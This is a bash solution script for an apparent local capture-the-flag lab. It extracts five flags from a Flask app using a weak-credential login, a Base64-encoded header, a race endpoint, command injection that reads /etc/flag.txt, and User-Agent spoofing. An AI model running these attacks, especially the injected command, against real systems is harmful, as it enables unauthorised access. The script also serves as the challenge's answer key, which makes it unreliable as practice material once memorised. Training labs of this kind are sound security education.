#!/bin/bash

# CTF 2025 - Automated Flag Extraction Script
# Usage: ./get_all_flags.sh [SERVER_URL]

# Default server URL
SERVER_URL=${1:-"http://192.168.29.153:5000"}

echo "🚩 CTF 2025 - Automated Flag Extraction"
echo "========================================"
echo "Server: $SERVER_URL"
echo ""

# Check if server is running
if ! curl -s "$SERVER_URL" > /dev/null; then
    echo "❌ Error: Server is not reachable at $SERVER_URL"
    echo "Please make sure the Flask application is running:"
    echo "  python3 app.py"
    exit 1
fi

echo "✅ Server is reachable"
echo ""

# Flag 1: Authentication Bypass
echo "🔐 Flag 1 - Authentication Bypass (Weak Credentials):"
echo "   Method: POST login with admin/password123"
flag1=$(curl -s -X POST -d "username=admin&password=password123" "$SERVER_URL/login" | grep -o "TCQ2025{[^}]*}" | head -1)
if [ ! -z "$flag1" ]; then
    echo "   ✅ Found: $flag1"
else
    echo "   ❌ Not found - Check login endpoint"
fi
echo ""

# Flag 2: API Header Analysis
echo "🌸 Flag 2 - API Header Analysis (Base64 in headers):"
echo "   Method: Check X-Flower-Token header in /api/flower"
header_value=$(curl -s -I "$SERVER_URL/api/flower" | grep -i "X-Flower-Token" | cut -d' ' -f2 | tr -d '\r\n')
if [ ! -z "$header_value" ]; then
    flag2=$(echo "$header_value" | base64 -d 2>/dev/null)
    if [ ! -z "$flag2" ]; then
        echo "   ✅ Found: $flag2"
    else
        echo "   ❌ Base64 decode failed: $header_value"
    fi
else
    echo "   ❌ Header not found"
fi
echo ""

# Flag 3: Race Condition
echo "🏃 Flag 3 - Race Condition (Timing Attack):"
echo "   Method: Rapid requests to /race endpoint"
flag3=""
for i in {1..8}; do 
    result=$(curl -s "$SERVER_URL/race" | grep -o '"flag":"[^"]*"' | cut -d'"' -f4 2>/dev/null)
    if [ ! -z "$result" ]; then
        flag3=$result
        break
    fi
    sleep 0.1
done
if [ ! -z "$flag3" ]; then
    echo "   ✅ Found: $flag3"
else
    echo "   ❌ Not found - Try manual rapid requests"
fi
echo ""

# Flag 4: Command Injection
echo "💻 Flag 4 - Command Injection (System Access):"
echo "   Method: Parameter injection in /system?cmd="
flag4=$(curl -s "$SERVER_URL/system?cmd=cat%20/etc/flag.txt" | grep -o "TCQ2025{[^}]*}" | head -1)
if [ ! -z "$flag4" ]; then
    echo "   ✅ Found: $flag4"
else
    echo "   ❌ Not found - Check system endpoint"
fi
echo ""

# Flag 5: User-Agent Spoofing
echo "🔍 Flag 5 - User-Agent Spoofing (Scanner Detection):"
echo "   Method: Custom User-Agent header"
flag5=$(curl -s -H "User-Agent: CTF-Scanner-2025" "$SERVER_URL/vulnerability" | grep -o '"flag":"[^"]*"' | cut -d'"' -f4 2>/dev/null)
if [ ! -z "$flag5" ]; then
    echo "   ✅ Found: $flag5"
else
    echo "   ❌ Not found - Check User-Agent header"
fi
echo ""

# Summary
echo "📊 SUMMARY - All Found Flags:"
echo "================================"
[ ! -z "$flag1" ] && echo "Flag 1: $flag1" || echo "Flag 1: ❌ NOT FOUND"
[ ! -z "$flag2" ] && echo "Flag 2: $flag2" || echo "Flag 2: ❌ NOT FOUND"
[ ! -z "$flag3" ] && echo "Flag 3: $flag3" || echo "Flag 3: ❌ NOT FOUND"
[ ! -z "$flag4" ] && echo "Flag 4: $flag4" || echo "Flag 4: ❌ NOT FOUND"
[ ! -z "$flag5" ] && echo "Flag 5: $flag5" || echo "Flag 5: ❌ NOT FOUND"
echo ""

# Count successful flags
total_flags=0
[ ! -z "$flag1" ] && ((total_flags++))
[ ! -z "$flag2" ] && ((total_flags++))
[ ! -z "$flag3" ] && ((total_flags++))
[ ! -z "$flag4" ] && ((total_flags++))
[ ! -z "$flag5" ] && ((total_flags++))

echo "🎯 Success Rate: $total_flags/5 flags found"

if [ $total_flags -eq 5 ]; then
    echo "🎉 CONGRATULATIONS! All flags captured!"
    echo "You've successfully completed CTF 2025!"
else
    echo "💡 Some flags missing. Check the detailed walkthrough:"
    echo "   - DETAILED_WALKTHROUGH_HINDI.md"
    echo "   - WALKTHROUGH.md"
fi

echo ""
echo "🔗 Useful URLs:"
echo "   Main page: $SERVER_URL/"
echo "   Challenge page: $SERVER_URL/page"
echo "   Hints: $SERVER_URL/robots.txt"